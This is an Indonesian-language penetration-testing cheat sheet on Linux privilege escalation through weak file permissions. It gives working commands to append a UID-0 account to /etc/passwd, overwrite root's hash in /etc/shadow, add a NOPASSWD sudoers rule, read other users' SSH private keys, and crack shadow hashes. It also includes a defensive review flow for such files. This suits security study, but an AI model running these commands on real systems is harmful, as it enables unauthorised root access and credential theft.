# Weak File Permission

Weak File Permission terjadi ketika file penting pada sistem memiliki permission
yang terlalu longgar, misalnya dapat dibaca atau ditulis oleh user yang tidak
seharusnya.

## Cek permission

```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers.d/
# Mengecek permission dan ownership file penting
```

## /etc/passwd writable

Jika `/etc/passwd` dapat ditulis oleh user biasa, file tersebut berpotensi
disalahgunakan untuk memodifikasi akun atau privilege.

```bash
# Generate hash
openssl passwd -1 pass123

# Tambah root user
echo 'hacker:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su hacker    # -> root
```

**Keterangan:**

```text
UID 0 → User memiliki privilege root
GID 0 → Group root
```

## /etc/shadow readable

Jika `/etc/shadow` dapat dibaca oleh user yang tidak seharusnya, hash password
dapat diperoleh dan kemudian dianalisis menggunakan password cracker.

```text
/etc/shadow
    ↓
Password Hash
    ↓
John the Ripper / Hashcat
    ↓
Password ditemukan jika berhasil di-crack
```

Crack root hash dengan `john` atau `hashcat`.

## /etc/shadow writable

Jika `/etc/shadow` dapat ditulis oleh user biasa, hash password akun dapat
berpotensi dimodifikasi.

```bash
# Generate hash baru
openssl passwd -1 pass123

# Atau dengan mkpasswd
mkpasswd -m sha-512 pass123

# Backup dan replace root hash
cp /etc/shadow /tmp/shadow.bak

# Edit /etc/shadow, ganti hash root (field ke-2)
# Format: root:<HASH>:19000:0:99999:7:::

# Contoh dengan sed (ganti hash root)
sed -i 's|^root:[^:]*:|root:$1$xyz$hash_disini:|' /etc/shadow

# Login sebagai root
su root   # password: pass123
```

**Keterangan:**

```text
/etc/shadow memiliki format:

username:password_hash:last_change:min:max:warn:inactive:expire:reserved

Field ke-2 → Password Hash
```

> **Catatan:** format hash harus sesuai dengan konfigurasi hashing sistem.
> Backup file terlebih dahulu sebelum melakukan perubahan pada lab/pengujian.

## /etc/sudoers.d/ writable

Jika user biasa dapat menulis file konfigurasi di `/etc/sudoers.d/`, konfigurasi
sudo dapat berpotensi dimodifikasi.

```text
<user> ALL=(ALL) NOPASSWD: ALL
```

**Keterangan:**

```text
<user>       → User yang diberikan privilege
ALL=(ALL)    → Dapat menjalankan command sebagai user lain
NOPASSWD     → Tidak memerlukan password
ALL          → Semua command
```

## SSH private key readable

Jika private key SSH milik user lain dapat dibaca, key tersebut dapat berpotensi
digunakan untuk autentikasi sebagai user tersebut.

```bash
cat /home/<user>/.ssh/id_rsa
# Membaca private SSH key
```

Gunakan untuk login sebagai user lain.

**Keterangan:**

```text
Private Key
     ↓
Autentikasi SSH
     ↓
User Account
     ↓
Potensi akses sebagai user tersebut
```

## File yang Perlu Diperiksa

```text
/etc/passwd
/etc/shadow
/etc/sudoers
/etc/sudoers.d/
/home/<user>/.ssh/id_rsa
```

## Alur Pemeriksaan

```text
Cari File Penting
      ↓
Cek Permission
      ↓
Cek Owner / Group
      ↓
Readable?
      ↓
Writable?
      ↓
Identifikasi Dampak
      ↓
Validasi Privilege Escalation
```

> **Catatan:** Weak File Permission tidak selalu berarti privilege escalation.
> Periksa kombinasi **permission + ownership + isi file + konteks user** untuk
> menentukan apakah temuan benar-benar dapat dieksploitasi.
